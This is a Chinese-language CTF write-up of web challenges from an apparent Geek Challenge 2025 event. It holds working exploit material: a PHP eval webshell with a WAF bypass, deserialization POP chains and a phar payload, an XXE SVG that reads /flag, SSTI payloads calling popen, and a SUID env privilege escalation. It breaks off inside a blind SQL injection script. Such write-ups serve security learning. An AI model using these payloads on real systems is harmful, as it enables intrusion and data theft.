# web
## 阿基里斯追乌龟
如果通过多次点击制造浮点误差，只能得到一个假的flag,必须通过源码分析，`let achillesPos = 0;let tortoisePos = 10000000000;`可以在控制台输入`achillesPos =20000000000;`  
```php
// 1. 构造阿基里斯位置 > 乌龟位置的 payload
const payload = {
    achilles_distance: 20000000000,  // 远大于乌龟初始位置 10000000000
    tortoise_distance: 10000000000   // 乌龟初始位置
};

// 2. 用前端自带的加密函数处理 payload
const encryptedData = encryptData(payload);

// 3. 发送 POST 请求到 /chase 接口
fetch('/chase', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
    },
    body: JSON.stringify({ "data": encryptedData })  // 按前端格式包装
})
.then(response => response.json())
.then(encryptedResponse => {
    // 4. 用前端自带的解密函数解析响应
    const result = decryptData(encryptedResponse.data);
    console.log('后端返回结果:', result);
    // 若成功，result.flag 即为真flag
    if (result.flag) {
        alert('获取到flag: ' + result.flag);
    }
})
.catch(error => console.error('请求错误:', error));

```
得到flag
我之前还以为只有用js代码可以解，后来发现可以抓包（是我想复杂了），抓一下包，有一个data是base64加密后的记录了二者的初始位置的内容，修改一下，让阿基里斯初始位置大于乌龟，再放包，就得到flag了.
## Vibe SEO
所谓的结构化站点地图，简单来说是一张写给爬虫看的导航图，告诉搜索引擎： 网站里有哪些页面、哪些页面比较重要、它们最近什么时候更新过
进入一个界面什么都没有，用f12也找不到什么有用的信息，可以用dirsearch扫一下目录，`D:\python\python.exe dirsearch.py -u http://019a1ed2-434d-72df-8597-67c6b7be4063.geek.ctfplus.cn/ -t 10 -e php,flag,txt,md,zip`扫到一个叫`/sitemap.xml`的文件，与题目说的结构化站点对应，应该就是他了，访问一下，进入到一个界面
```html
This XML file does not appear to have any style information associated with it. The document tree is shown below.  
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
<url>
<loc>http://localhost/</loc>
<changefreq>weekly</changefreq>
</url>
<url>
<loc>http://localhost/aa__^^.php</loc>
<changefreq>never</changefreq>
</url>
</urlset>
```
这是**站点地图数据文件**，从中可以看到一个文件`aa__^^.php`访问一下，他回显
```
**Warning**: Undefined array key "filename" in **/var/www/html/aa__^^.php** on line **3**  
  
**Deprecated**: strlen(): Passing null to parameter #1 ($string) of type string is deprecated in **/var/www/html/aa__^^.php** on line **3**  
  
**Warning**: Undefined array key "filename" in **/var/www/html/aa__^^.php** on line **4**  
  
**Deprecated**: readfile(): Passing null to parameter #1 ($filename) of type string is deprecated in **/var/www/html/aa__^^.php** on line **4**  
  
**Fatal error**: Uncaught ValueError: Path cannot be empty in /var/www/html/aa__^^.php:4 Stack trace: #0 /var/www/html/aa__^^.php(4): readfile('') #1 {main} thrown in **/var/www/html/aa__^^.php** on line **4**
```
根据报错提示因该有一个filename参数，要执行readfile("")，试了一下还有长度限制，最长十个字符，把常见的flag文件名试了个遍，都说不存在，只有`aa__^^.php?filename=aa__^^.php`返回界面是一片空白，明显藏着东西，打开f12,看到了php源码
```php
<?php
$flag = fopen('/my_secret.txt', 'r');
if (strlen($_GET['filename']) < 11) {
readfile($_GET['filename']);
} else {
echo "Filename too long";
}
```
看到一个文件`/my_secret.txt`但明显超过长度限制了,不过，前面 fopen 打开了目标文件 /my_secret.txt ，并将 handle 赋值给了变量 $flag 。这里仅仅是打开了文件，并没有关闭 它，因此可以通过文件描述符来读取，
（Linux 中一个进程打开一个文件时，内核会分配一个文件描述符给这个文件 handle，新打开的文件 从 3 开始递增，可以通过 /proc/self/fd/<自然数> 或 /dev/fd/<自然数> 来访问这些文件描 述符 ）,Linux 上 `/dev/fd/<n>` 是 `/proc/self/fd/<n>` 的短等价（通常由 shell 提供的符号链接）。注意字符数计数：`/dev/fd/10` 恰好是 10 个字符 → **满足长度 ≤10**。可以用一个脚本来遍历从/dev/fd/0-99,(直接在kali-linux运行)
```python
import requests  
  
url=input("请输入url:")  
  
for i in range(0,99):  
    payload={"filename":f"/dev/fd/{i}"}  
    r=requests.get(url,params=payload)  
    if 'SYC'  in r.text:  
        print(r.text)
```
最后在`/dev/fd/13`输出了flag,所以payload为`http://019a1ed2-434d-72df-8597-67c6b7be4063.geek.ctfplus.cn/aa__%5E%5E.php?filename=/dev/fd/13`  
`/dev/fd/<n>`，可用于访问进程的文件描述符（fd），从之前的源码得知文件已经打开，  
**关键点（一句话）**：题目通过 `fopen('/my_secret.txt','r')` 在进程内打开了 flag，但对 `filename` 做了 `strlen(<11)` 限制，必须用**短路径**访问已打开的文件描述符（fd）。
遇到 `fopen('/...')` 且直接读取被拒绝时，思考“文件是否已作为 fd 保存在进程内”；若是，`php://fd/N` 或 `/dev/fd/N` 常常能读取（注意长度/权限限制）。
## one_last_image
这一题试了好多次，发现并不是过滤后缀，如果你传一个空的php文件，他不会显示`waf`,会有一长串报错其中有`PIL.UnidentifiedImageError: cannot identify image file '/var/www/html/uploads/0e65935f-1e4b-4f48-ac23-b9f034261550.php'`说明文件其实上传成功了，并且还是php文件，上传到了`uploads`文件夹下，如果我将文件内容改为一句话木马，
```php
<?php
@eval($_POST['cmd']);
phpinfo();
?>
```
上传会显示`waf`,可能是检测了`<?php`,可以将其改为`<?=`
```php
<?=
@eval($_POST['cmd']);
phpinfo();
?>
```
上传成功，根据报错提示的地址访问`uploads/0e65935f-1e4b-4f48-ac23-b9f034261550.php`得到php环境变量，在其中搜索`SYC`,得到flag,或者连接蚁剑，在任意文件上右键，打开控制台，输入`env`,输出的环境变量里有flag
## popself
```php
<?php
show_source(__FILE__);

error_reporting(0);
class All_in_one
{
    public $KiraKiraAyu;
    public $_4ak5ra;
    public $K4per;
    public $Samsāra;
    public $komiko;
    public $Fox;
    public $Eureka;
    public $QYQS;
    public $sleep3r;
    public $ivory;
    public $L;

    public function __set($name, $value){
        echo "他还是没有忘记那个".$value."<br>";
        echo "收集夏日的碎片吧<br>";

        $fox = $this->Fox;

        if ( !($fox instanceof All_in_one) && $fox()==="summer"){
            echo "QYQS enjoy summer<br>";
            echo "开启循环吧<br>";
            $komiko = $this->komiko;
            $komiko->Eureka($this->L, $this->sleep3r);//3.Eureka为不存在的方法，他不是方法，调用会触发__call
        }
    }

    public function __invoke(){
        echo "恭喜成功signin!<br>";
        echo "welcome to Geek_Challenge2025!<br>";
        $f = $this->Samsāra;//6.让Samsāra=system
        $arg = $this->ivory;//7.ivory='env'
        $f($arg);//执行命令，输出环境变量，得到flag
    }
    public function __destruct(){//1.最先触发

        echo "你能让K4per和KiraKiraAyu组成一队吗<br>";

        if (is_string($this->KiraKiraAyu) && is_string($this->K4per)) {
            if (md5(md5($this->KiraKiraAyu))===md5($this->K4per)){
                die("boys和而不同<br>");
            }

            if(md5(md5($this->KiraKiraAyu))==md5($this->K4per)){
                echo "BOY♂ sign GEEK<br>";
                echo "开启循环吧<br>";
                $this->QYQS->partner = "summer";//2.partner为不存在的成员属性，会触发__set
            }
            else {
                echo "BOY♂ can`t sign GEEK<br>";
                echo md5(md5($this->KiraKiraAyu))."<br>";
                echo md5($this->K4per)."<br>";
            }
        }
        else{
            die("boys堂堂正正");
        }
    }

    public function __tostring(){
        echo "再走一步...<br>";
        $a = $this->_4ak5ra;
        $a();//5.对象被当做函数处理时自动调用__invoke
    }

    public function __call($method, $args){        
        if (strlen($args[0])<4 && ($args[0]+1)>10000){
            echo "再走一步<br>";
            echo $args[1];//4.对象被当做字符串处理时自动调用__tostring
        }
        else{
            echo "你要努力进窄门<br>";
        }
    }
}

class summer {
    public static function find_myself(){
        return "summer";
    }
}
$payload = $_GET["24_SYC.zip"];

if (isset($payload)) {
    unserialize($payload);
} else {
    echo "没有大家的压缩包的话，瓦达西！<br>";
}

?> 没有大家的压缩包的话，瓦达西！


```
完整调用链
```
__destruct()
  ↓
$this->QYQS->partner = "summer"
  ↓
触发 QYQS->__set("partner", "summer")
  ↓
__set()
  ↓
$komiko->Eureka($this->L, $this->sleep3r)
  ↓
__call("Eureka", [$L, $sleep3r])
  ↓
if 条件成立 -> echo $sleep3r
  ↓
触发 $sleep3r->__tostring()
  ↓
__tostring()
  ↓
调用 $this->_4ak5ra()
```
构造代码
```php
<?php
class All_in_one {
    public $KiraKiraAyu;
    public $_4ak5ra;
    public $K4per;
    public $Samsāra;
    public $komiko;
    public $Fox;
    public $Eureka;
    public $QYQS;
    public $sleep3r;
    public $ivory;
    public $L;
}
// 顶层对象与中间对象
$obj = new All_in_one();//最终序列化的根对象
$qyqs = new All_in_one();//$obj->QYQS指向它
$komiko = new All_in_one();//$qyqs->komiko指向它
$sleep_obj = new All_in_one();//$qyqs->sleepe3r指向它
$exec_obj = new All_in_one();//被放到$sleep_obj->_4ak5ra,最终被调用
$obj->KiraKiraAyu = '179122048';//二次MD5后是0e983430692806892134340492059275弱比较解析为0
$obj->K4per       = 'QNKCDZO';//一次MD5后是0e830400451993494058024219903391弱比较也为0
$obj->QYQS        = $qyqs;
$qyqs->Fox     = ['summer', 'find_myself'];
$qyqs->komiko  = $komiko;
$qyqs->L = '1e4';//长度小于4，但+1大于10000
$qyqs->sleep3r = $sleep_obj;
$sleep_obj->_4ak5ra = $exec_obj;
$exec_obj->Samsāra = 'system';//执行系统命令
$exec_obj->ivory   = 'env';//输出环境变量
echo serialize($obj);
```
利用 `__destruct()` 里的弱比较触发 `QYQS->partner = "summer"`，进而走 `__set()`，调用 `komiko->Eureka($L, $sleep3r)`，落到 `__call()` 的条件分支，`echo $args[1]` 导致对象被 string 化，进入 `__tostring()`，再通过 `_4ak5ra` 调用触发 `__invoke()`，最终让 `Samsāra`（`system`）以 `ivory` (`env`) 为参数被调用，从而执行 `system("env")`。
最终payload
~~~
?24[SYC.zip=O:10:"All_in_one":11:
{s:11:"KiraKiraAyu";s:9:"179122048";s:7:"_4ak5ra";N;s:5:"K4per";s:7:"QNKCDZO";s:8:"Samsāra";N;s:6:"komiko";N;s:3:"Fox";N;s:6:"Eureka";N;s:4:"QYQS";O:10:"All_in_one":11:
{s:11:"KiraKiraAyu";N;s:7:"_4ak5ra";N;s:5:"K4per";N;s:8:"Samsāra";N;s:6:"komiko";O:10:"All_in_one":11:{s:11:"KiraKiraAyu";N;s:7:"_4ak5ra";N;s:5:"K4per";N;s:8:"Samsāra";N;s:6:"komiko";N;s:3:"Fox";N;s:6:"Eureka";N;s:4:"QYQS";N;s:7:"sleep3r";N;s:5:"ivory";N;s:1:"L";N;}s:3:"Fox";a:2:{i:0;s:6:"summer";i:1;s:11:"find_myself";}s:6:"Eureka";N;s:4:"QYQS";N;s:7:"sleep3r";O:10:"All_in_one":11:{s:11:"KiraKiraAyu";N;s:7:"_4ak5ra";O:10:"All_in_one":11:{s:11:"KiraKiraAyu";N;s:7:"_4ak5ra";N;s:5:"K4per";N;s:8:"Samsāra";s:6:"system";s:6:"komiko";N;s:3:"Fox";N;s:6:"Eureka";N;s:4:"QYQS";N;s:7:"sleep3r";N;s:5:"ivory";s:3:"env";s:1:"L";N;}s:5:"K4per";N;s:8:"Samsāra";N;s:6:"komiko";N;s:3:"Fox";N;s:6:"Eureka";N;s:4:"QYQS";N;s:7:"sleep3r";N;s:5:"ivory";N;s:1:"L";N;}s:5:"ivory";N;s:1:"L";s:3:"1e4";}s:7:"sleep3r";N;s:5:"ivory";N;s:1:"L";N;}
~~~
再注意一下一个非法传参的问题，参数应该是`24[SYC.zip`不是`24_SYC.zip`,这个貌似不用url加密也行，没有私有属性和受保护的属性
#### 小结：完整触发链（一步步）

1. 程序结束 / 对象销毁时执行 `$obj->__destruct()`。
2. `__destruct()` 的弱比较 `==` 成立 → 执行 `$this->QYQS->partner = "summer"`。
3. 触发 `$qyqs->__set("partner","summer")`：读取 `$qyqs->Fox` 并调用它（`['summer','find_myself']()`）返回 `'summer'` → 条件满足。
4. `__set()` 执行 `$komiko->Eureka($L, $sleep3r)` → 触发 `komiko->__call('Eureka', [$L,$sleep3r])`。
5. `__call()` 检查 `$L`（`'1e4'`）：`strlen<4` 且 `($L+1)>10000` 成立 → `echo $sleep3r`。
6. `echo $sleep3r` 触发 `sleep_obj->__tostring()`，在其中 `$a = $this->_4ak5ra; $a();` 执行 `$exec_obj->__invoke()`（因为 `$a` 为对象）。
7. `__invoke()` 读取 `Samsāra` 与 `ivory` 并调用 `$f($arg)` → `system('env')` 被调用并执行。
## eeeeezzzzzzZip
扫一下目录，有一个www.zip文件，访问得到，里面有index.php login.php 和 upload.php,而最开始就在login.php，看一下源码`if ($u === 'admin' && $p === 'guest123') {`得到用户名和密码，登录成功进入index.php界面，可以在右上角上传压缩文件，看一下源码
```php
if (isset($_GET['f'])) {
    $filename = basename($_GET['f']);
    $fullpath = $SANDBOX . '/' . $filename;
    if (file_exists($fullpath) && preg_match('/\.(zip|bz2|gz|xz|7z)$/i', $filename)) {
        ob_start();
        @include($fullpath);
        $result = ob_get_clean();
    } else {
        $result = "文件不存在或非法类型。";
    }
}
?>
```
还有一个黑名单
```php
$BLOCK_LIST = [
    "__HALT_COMPILER()",
    "PK",
    "<?",
    "<?php",
    "phar://",
    "php",
    "?>"
];
```
只要扩展名匹配，并且避开过滤，你上传的“压缩文件”会被当成 PHP 代码 include 执行
又因为
```php
$head = fread($fh, 4096);
    fseek($fh, -4096, SEEK_END);
    $tail = fread($fh, 4096);
    fclose($fh);
```
说明只过滤头尾4096个字节，可以在中间插入可执行代码，可以构造一个文件叫`shell.xz`文件内容是前有`ý7zXZ`伪造文件头，后面跟4096个字母，在插入任意php代码，如`<?php system('env');?>`,后面再跟4096个字母，将这个文件提交,回到index.php界面，找到刚才上传的文件，点击include,发现右面显示出环境变量，搜索SYC得到flag
## Image Viewer
题目是一个图片预览网站，因为是预览，应该就不是文件上传漏洞了，上传的图片到不了后端，根据源码
```html
<form enctype="multipart/form-data" method="post" action="/render" class="card" style="margin-top:14px">
<input type="file" name="file" accept=".svg,image/svg+xml,.png,.jpg,.jpeg,.gif,image/*" />
<input class="btn primary" type="submit" value="Render">
</form>
```
不仅允许上传图片文件，还可以上传.svg文件，而 **SVG 是可执行 XML**，能嵌 JavaScript、外链资源、甚至发起请求。
构造一个svg文件，内容为
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///flag">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="800" height="200">
  <text x="10" y="40" font-size="30">&xxe;</text>
</svg>

```
render得到flag
![图片](/image/15.png)
svg文件注解
```xml
<?xml version="1.0"?>XML 声明,告诉解析器这是一个 XML 文档，版本是 1.0
<!DOCTYPE svg [定义了文档类型DTD,DTD 可以定义 **实体（Entities）**，用于 XML 中的文本替换,`svg` 这里是根元素名，告诉解析器 DTD 应该用于 `<svg>` 文档
  <!ENTITY xxe SYSTEM "file:///flag">定义一个外部实体，名字叫 `xxe``SYSTEM "file:///flag"` 指定实体内容从本地文件 `/flag` 读取,当 XML 中出现 `&xxe;` 时，解析器会把 `/flag` 文件内容替换进去
]>
<svg xmlns="http://www.w3.org/2000/svg" width="800" height="200">告诉解析器这是标准 SVG，保证解析器按照 SVG 规则处理
  <text x="10" y="40" font-size="30">&xxe;</text>
</svg>font-size字体大小，方便在 SVG 中清晰看到 flag,x,y是起始坐标
```
这道题的核心漏洞：SVG XML 实体注入（XXE）,题目的 `/render` 功能会接收你上传的 `.svg`,在服务器端解析 XML（使用 XML parser，而不是纯前端渲染）,解析 DTD（Document Type Definition）,在渲染图像前，把实体扩展到 SVG 中,最终把渲染结果返回给用户,只要服务器端用了 **XML 解析器**（如 libxml2），就可能受到 **XXE（XML External Entity）攻击**影响。XXE允许攻击者读取服务器本地文件，例如/flag,
**原理**:Image Viewer 服务器想要渲染 SVG,它必须解析 XML,必须把文本节点转换为渲染图,通常会使用 libxml2（或类似库）,libxml2 默认会打开 DTD,展开实体,访问系统实体（如 `file://`）,所以它会去读取file:///flag,把这个文件的内容当成字符串加载到实体 `&xxe;` 中。
XML 实体替换过程如下:
原 SVG：
```xml
<text>&xxe;</text>
```
解析成：
```xml
<text>SYC{flag内容}</text>
```
这是在服务器上发生的
服务器把 SVG 解析成 internal DOM（内部结构）,把 DOM 转为位图（PNG）或直接转成安全 SVG,再把它返回给用户显示,
其实就是/flag,里面其实是文本，只是渲染成图片呈现出来了
## ez-seralize
右键查看源码，发现有一句提示`<!--RUN printf "open_basedir=/var/www/html:/tmp\nsys_temp_dir=/tmp\nupload_tmp_dir=/tmp\n" \ > /usr/local/etc/php/conf.d/zz-open_basedir.ini-->`只有 `/var/www/html` 和 `/tmp` 两个可读路径，也就是网页目录，可以输入`index.php`读取到
```php
<?php
ini_set('display_errors', '0');
$filename = isset($_GET['filename']) ? $_GET['filename'] : null;

$content = null;
$error = null;

if (isset($filename) && $filename !== '') {
    $balcklist = ["../","%2e","..","data://","\n","input","%0a","%","\r","%0d","php://","/etc/passwd","/proc/self/environ","php:file","filter"];
    foreach ($balcklist as $v) {
        if (strpos($filename, $v) !== false) {
            $error = "no no no";
            break;
        }
    }

    if ($error === null) {
        if (isset($_GET['serialized'])) {
            require 'function.php';
            $file_contents= file_get_contents($filename);
            if ($file_contents === false) {
                $error = "Failed to read seraizlie file or file does not exist: " . htmlspecialchars($filename);
            } else {
                $content = $file_contents;
            }
        } else {
            $file_contents = file_get_contents($filename);
            if ($file_contents === false) {
                $error = "Failed to read file or file does not exist: " . htmlspecialchars($filename);
            } else {
                $content = $file_contents;
            }
        }
    }
} else {
    $error = null;
}
?>
```
列出了一系列黑名单，其中有一个重要get参数serialized,和一个重要文件function.php,访问一下，得到
```php
<?php
class A {
    public $file;
    public $luo;//赋值为B类

    public function __construct() {
    }

    public function __toString() {
        $function = $this->luo;
        return $function();//3.当成函数调用，触发__invoke,但要触发__tostring
    }
}

class B {
    public $a;//赋值为C类
    public $test;//要赋值为A类

    public function __construct() {
    }

    public function __wakeup()
    {
        echo($this->test);//4.触发__tostring,但要触发__wakeup
    }

    public function __invoke() {
        $this->a->rce_me();//2.触发rce_me,但要触发__invoke
    }
}

class C {
    public $b;

    public function __construct($b = null) {
        $this->b = $b;
    }

    public function rce_me() {
        echo "Success!\n";
        system("cat /flag/flag.txt > /tmp/flag");//1.最终要触发的，但要触发rce_me
    }
}
```
poc
```php
<?php
class A {
    public $file;
    public $luo;
}
class B {
    public $a;
    public $test;
}
class C {
    public $b;
}
$a=new A();
$b=new B();
$c=new C();
$a->luo=$b;
$b->a=$c;
$b->test=$a;
echo serialize($b);
```
可以看到是pop链,但没看到反序列化操作，这时就想到用phar，可以用
```php
<?php
class A {
    public $file;
    public $luo;
    public function __toString() {
        $f = $this->luo;
        return $f();
    }
}
class B {
    public $a;
    public $test;
    public function __wakeup() {
        echo($this->test);
    }
    public function __invoke() {
        $this->a->rce_me();
    }
} 
class C {
    public $b;
    public function rce_me() {
        system("cat /flag/flag.txt > /tmp/flag");
    }
}
$a = new A();
$b = new B();
$c = new C();
$b->test = $a;
$a->luo = $b;
$b->a = $c;
@unlink("exp.phar");
$phar = new Phar("exp1.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");
// 关键：metadata 必须传对象，不用 serialize
$phar->setMetadata($b);
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
?>
```
在本地生成一个exp1.phar的文件，猜测应该有上传的界面，读取uploads.php发现
```php
<?php
$uploadDir = __DIR__ . '/uploads/';
if (!is_dir($uploadDir)) {
    mkdir($uploadDir, 0755, true);
}
$whitelist = ['txt', 'log', 'jpg', 'jpeg', 'png', 'zip','gif','gz'];
$allowedMimes = [
    'txt'  => ['text/plain'],
    'log'  => ['text/plain'],
    'jpg'  => ['image/jpeg'],
    'jpeg' => ['image/jpeg'],
    'png'  => ['image/png'],
    'zip'  => ['application/zip', 'application/x-zip-compressed', 'multipart/x-zip'],
    'gif'  => ['image/gif'],
    'gz'   => ['application/gzip', 'application/x-gzip']
];

$resultMessage = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $file = $_FILES['file'];

    if ($file['error'] === UPLOAD_ERR_OK) {
        $originalName = $file['name'];
        $ext = strtolower(pathinfo($originalName, PATHINFO_EXTENSION));
        if (!in_array($ext, $whitelist, true)) {
            die('File extension not allowed.');
        }

        $mime = $file['type'];
        if (!isset($allowedMimes[$ext]) || !in_array($mime, $allowedMimes[$ext], true)) {
            die('MIME type mismatch or not allowed. Detected: ' . htmlspecialchars($mime));
        }

        $safeBaseName = preg_replace('/[^A-Za-z0-9_\-\.]/', '_', basename($originalName));
        $safeBaseName = ltrim($safeBaseName, '.');
        $targetFilename = time() . '_' . $safeBaseName;

        file_put_contents('/tmp/log.txt', "upload file success: $targetFilename, MIME: $mime\n");

        $targetPath = $uploadDir . $targetFilename;
        if (move_uploaded_file($file['tmp_name'], $targetPath)) {
            @chmod($targetPath, 0644);
            $resultMessage = '<div class="success"> File uploaded successfully '. '</div>';
        } else {
            $resultMessage = '<div class="error"> Failed to move uploaded file.</div>';
        }
    } else {
        $resultMessage = '<div class="error"> Upload error: ' . $file['error'] . '</div>';
    }
}
?>
```
对上传文件的后缀和conten-type都进行了过滤，可以抓包后伪造，phar文件改后缀不影响服务器解析为phar文件，可以绕过，访问/uploads.php界面，上传成功，但他不显示上传到哪里了，根据`$uploadDir = __DIR__ . '/uploads/';`可知放到网页目录下的/uploads目录下了，又根据`file_put_contents('/tmp/log.txt', "upload file success: $targetFilename, MIME: $mime\n");`可知访问一下日志文件，得到`upload file success: 1763782480_exp1.jpg, MIME: image/jpeg`得到文件名,之后payload`?filename=phar:///var/www/html/uploads/1763782480_exp1.jpg&serialized=1`其中注意phar://只支持绝对路径，serialized这个参数只检测是否存在，存在就`require 'function.php';`,phar自动触发反序列化，pop就开始了，最后执行`system("cat /flag/flag.txt > /tmp/flag");`再`?filename=/tmp/flag`得到flag
## ez_read
题目可以试一下读取`/etc/passwd`看到最后一行`/opt/___web_very_strange_42___`十分奇怪，试一下读取`/opt/___web_very_strange_42___/app.py` 
看到
```python
from flask import Flask, request, render_template, render_template_string, redirect, url_for, session
import os

app = Flask(__name__, template_folder="templates", static_folder="static")
app.secret_key = "key_ciallo_secret"

USERS = {}


def waf(payload: str) -> str:
    print(len(payload))
    if not payload:
        return ""
        
    if len(payload) not in (114, 514):
        return payload.replace("(", "")
    else:
        waf = ["__class__", "__base__", "__subclasses__", "__globals__", "import","self","session","blueprints","get_debug_flag","json","get_template_attribute","render_template","render_template_string","abort","redirect","make_response","Response","stream_with_context","flash","escape","Markup","MarkupSafe","tojson","datetime","cycler","joiner","namespace","lipsum"]
        for w in waf:
            if w in payload:
                raise ValueError(f"waf")

    return payload


@app.route("/")
def index():
    user = session.get("user")
    return render_template("index.html", user=user)


@app.route("/register", methods=["GET", "POST"])
def register():
    if request.method == "POST":
        username = (request.form.get("username") or "")
        password = request.form.get("password") or ""
        if not username or not password:
            return render_template("register.html", error="用户名和密码不能为空")
        if username in USERS:
            return render_template("register.html", error="用户名已存在")
        USERS[username] = {"password": password}
        session["user"] = username
        return redirect(url_for("profile"))
    return render_template("register.html")


@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = (request.form.get("username") or "").strip()
        password = request.form.get("password") or ""
        user = USERS.get(username)
        if not user or user.get("password") != password:
            return render_template("login.html", error="用户名或密码错误")
        session["user"] = username
        return redirect(url_for("profile"))
    return render_template("login.html")


@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("index"))


@app.route("/profile")
def profile():
    user = session.get("user")
    if not user:
        return redirect(url_for("login"))
    name_raw = request.args.get("name", user)
    
    try:
        filtered = waf(name_raw)
        tmpl = f"欢迎，{filtered}"
        rendered_snippet = render_template_string(tmpl)
        error_msg = None
    except Exception as e:
        rendered_snippet = ""
        error_msg = f"渲染错误: {e}"
    return render_template(
        "profile.html",
        content=rendered_snippet,
        name_input=name_raw,
        user=user,
        error_msg=error_msg,
    )


@app.route("/read", methods=["GET", "POST"])
def read_file():
    user = session.get("user")
    if not user:
        return redirect(url_for("login"))

    base_dir = os.path.join(os.path.dirname(__file__), "story")
    try:
        entries = sorted([f for f in os.listdir(base_dir) if os.path.isfile(os.path.join(base_dir, f))])
    except FileNotFoundError:
        entries = []

    filename = ""
    if request.method == "POST":
        filename = request.form.get("filename") or ""
    else:
        filename = request.args.get("filename") or ""

    content = None
    error = None

    if filename:
        sanitized = filename.replace("../", "")
        target_path = os.path.join(base_dir, sanitized)
        if not os.path.isfile(target_path):
            error = f"文件不存在: {sanitized}"
        else:
            with open(target_path, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()

    return render_template("read.html", files=entries, content=content, filename=filename, error=error, user=user)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=False)
```
说明可以在profile界面进行SSTI,但有严格过滤，可以用字符反转绕过一下，如果字符长度不是114或514就要删掉所有(,所以必须让长度凑齐114或514，可得payload
~~~
profile?name={%set a='__ssalc__'|reverse%}{%set b='__esab__'|reverse%}{%set c='__sessalcbus__'|reverse%}{%set d='__tini__'|reverse%}{%set e='__slabolg__'|reverse%}{%set f='__tropmi__'|reverse%}{{''[a][b][c]()[121][d][e]['__builtins__'][f]('os').popen('ls /').read()}}aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
~~~
 得到`bin boot dev entrypoint.sh etc flag home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var`看到flag了，cat一下
 ~~~
 profile?name={%set a='__ssalc__'|reverse%}{%set b='__esab__'|reverse%}{%set c='__sessalcbus__'|reverse%}{%set d='__tini__'|reverse%}{%set e='__slabolg__'|reverse%}{%set f='__tropmi__'|reverse%}{{''[a][b][c]()[121][d][e]['__builtins__'][f]('os').popen('cat /flag').read()}}aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 ~~~
 但却返回为空，试一下env,里面没有flag,但有一个hint:`HINT=用我提个权吧`, 可以试一下whoami,发现用户是ctf,不是root，权限不够,根据提示可以试一下提权,用
 ~~~
 {%set a='__ssalc__'|reverse%}{%set b='__esab__'|reverse%}{%set c='__sessalcbus__'|reverse%}{%set d='__tini__'|reverse%}{%set e='__slabolg__'|reverse%}{%set f='__tropmi__'|reverse%}{{''[a][b][c]()[121][d][e]['__builtins__'][f]('os').popen('find / -user root -perm -4000 -print 2>/dev/null').read()}}aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 ~~~
 得到
`/usr/bin/su /usr/bin/gpasswd /usr/bin/chfn /usr/bin/chsh /usr/bin/umount /usr/bin/newgrp /usr/bin/passwd /usr/bin/mount /usr/local/bin/env`发现有很多都可以用来提权，但env是最简单，最合适的，因为他有suid权限，可以通过
~~~
{%set a='__ssalc__'|reverse%}{%set b='__esab__'|reverse%}{%set c='__sessalcbus__'|reverse%}{%set d='__tini__'|reverse%}{%set e='__slabolg__'|reverse%}{%set f='__tropmi__'|reverse%}{{''[a][b][c]()[121][d][e]['__builtins__'][f]('os').popen('/usr/local/bin/env cat /flag').read()}}aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
~~~
来提权成功执行cat /flag,得到flag`SYC{D0nt_m@ke_w1sdom_awar3_of_Rules_019aab15922c7ae5b054e12d1e18fb72}`,记得每次改的时候，要确保长度是514
## Sequal No Uta
这道题明显考sql注入，试了一下，把空格过滤了，但其他字符没过滤，试一下`1'/**/or/**/1=1--+`回显`该用户存在且活跃`,要是`1'/**/or/**/1=0--+`回显`未找到用户或已停用`说明是布尔盲注，写一个脚本
```python
import requests

url = 'http://019aab5b-25f7-7eea-9de8-a7b77a86dcc4.geek.ctfplus.cn/check.php'   # 例如 http://xxx/check.php

TRUE_TEXT = "该用户存在且活跃"

def check(payload):
    r = requests.get(url, params={"name": payload})
    return TRUE_TEXT in r.text

result = ""
chars = r"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}_+-*/@!#$%^&()[]=;:,.?<>~`'\" \n\r"

# 先获取长度
length = 0
for i in range(1, 500):
    # 1'/**/or/**/(select/**/length(name)/**/from/**/sqlite_master/**/limit/**/1)={i}--+
